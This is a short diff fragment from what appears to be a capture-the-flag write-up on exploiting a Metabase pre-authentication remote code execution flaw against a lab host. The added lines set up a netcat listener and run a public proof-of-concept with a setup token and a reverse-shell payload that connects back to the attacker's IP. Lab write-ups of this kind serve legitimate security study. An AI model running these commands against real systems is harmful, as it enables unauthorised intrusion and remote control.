@@ -36,7 +36,17 @@ Once in the login page, I found out that it uses Metabase which was critical to 
 
 https://github.com/m3m0o/metabase-pre-auth-rce-poc
 
+
+Terminal 1 :
+
 ```
+nc -lnvp 9001
+```
+
+Terminal 2 :
+
+```
+python3 main.py -u http://data.analytical.htb/ -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "sh -i >& /dev/tcp/10.10.14.22/9001 0>&1"
 
 ```
 
